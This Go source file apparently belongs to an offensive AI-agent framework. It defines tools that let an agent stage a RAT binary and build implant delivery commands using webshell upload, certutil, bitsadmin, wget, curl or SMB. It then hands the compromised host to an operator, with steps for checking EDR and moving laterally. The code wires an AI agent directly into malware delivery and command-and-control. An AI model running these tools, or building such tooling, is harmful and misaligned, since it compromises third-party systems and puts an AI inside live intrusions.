package agent

import (
	"context"
	"encoding/json"
	"fmt"

	"github.com/Autumn-27/artex/c2bridge"
	actool "github.com/Autumn-27/norma/tool"
)

// C2StageImplantArgs are the parameters for c2_stage_implant.
type C2StageImplantArgs struct {
	Arch string `json:"arch"` // "x64" or "x86"
}

// C2DeliverImplantArgs are the parameters for c2_deliver_implant.
type C2DeliverImplantArgs struct {
	Vector     string `json:"vector"`      // delivery vector type
	ShellURL   string `json:"shell_url"`   // webshell URL for webshell_upload vector
	TargetPath string `json:"target_path"` // destination path on target
	Arch       string `json:"arch"`        // "x64" or "x86"
}

// C2AwaitOperatorArgs are the parameters for c2_await_operator.
type C2AwaitOperatorArgs struct {
	TargetHost     string `json:"target_host"`     // target hostname or IP
	DeliveryStatus string `json:"delivery_status"` // outcome of c2_deliver_implant
}

// toolC2StageImplant checks whether the RAT binary is present locally for the given arch.
func toolC2StageImplant() actool.CoreTool {
	return writeTool(
		"c2_stage_implant",
		"Check if the RAT binary is available locally for the given architecture. Returns the local path on success.",
		obj(map[string]any{
			"arch": str("Target architecture: x64 (default) or x86"),
		}, "arch"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args C2StageImplantArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if args.Arch == "" {
				args.Arch = "x64"
			}
			cfg := c2bridge.LoadConfig()
			b := c2bridge.NewLocalBackend(cfg)
			path, err := b.Stage(context.Background(), args.Arch)
			if err != nil {
				return actool.Errorf("implant not staged: " + err.Error()), nil
			}
			return actool.Text(fmt.Sprintf("implant ready: arch=%s path=%s", args.Arch, path)), nil
		},
	)
}

// toolC2DeliverImplant selects a delivery vector and returns the shell command to execute on the target.
func toolC2DeliverImplant() actool.CoreTool {
	return writeTool(
		"c2_deliver_implant",
		"Build and return the delivery command that stages the RAT binary on the target via the specified vector. Execute the returned command through the worker's shell/exec tool.",
		obj(map[string]any{
			"vector":      str("Delivery vector: webshell_upload, echo_b64, certutil, bitsadmin, wget, curl, smb"),
			"shell_url":   str("URL of an existing webshell (required for webshell_upload vector)"),
			"target_path": str("Destination path on the target (e.g. C:\\Windows\\Temp\\svc.exe)"),
			"arch":        str("Binary architecture: x64 (default) or x86"),
		}, "vector", "target_path"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args C2DeliverImplantArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if args.Arch == "" {
				args.Arch = "x64"
			}
			cfg := c2bridge.LoadConfig()
			b := c2bridge.NewLocalBackend(cfg)
			binaryPath, err := b.Stage(context.Background(), args.Arch)
			if err != nil {
				return actool.Errorf("implant not staged: " + err.Error()), nil
			}
			vector := c2bridge.DeliveryVector{
				Type:       args.Vector,
				ShellURL:   args.ShellURL,
				TargetPath: args.TargetPath,
			}
			cmd := c2bridge.BuildDeliveryCommand(vector, binaryPath)
			return actool.Text(
				"delivery_command=" + cmd +
					"\nvector=" + args.Vector +
					"\ntarget_path=" + args.TargetPath +
					"\narch=" + args.Arch,
			), nil
		},
	)
}

// toolC2AwaitOperator signals operator handoff and returns post-delivery instructions.
func toolC2AwaitOperator() actool.CoreTool {
	return writeTool(
		"c2_await_operator",
		"Signal operator handoff after implant delivery. Returns the operator handoff message with next steps and target details.",
		obj(map[string]any{
			"target_host":     str("Target hostname or IP address where the implant was delivered"),
			"delivery_status": str("Outcome from c2_deliver_implant (delivered/failed/pending_operator)"),
		}, "target_host", "delivery_status"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args C2AwaitOperatorArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			msg := fmt.Sprintf(
				"[C2 HANDOFF] Operator action required.\n"+
					"Target: %s\n"+
					"Delivery status: %s\n\n"+
					"Next steps:\n"+
					"1. Verify implant execution on target (check-in beacon or process list).\n"+
					"2. Confirm EDR status via check_edr finding before lateral movement.\n"+
					"3. Refer to skills/c2-handoff/SKILL.md for post-exploitation doctrine.\n"+
					"4. Agent work complete — operator takes control of the session.",
				args.TargetHost,
				args.DeliveryStatus,
			)
			return actool.Text(msg), nil
		},
	)
}
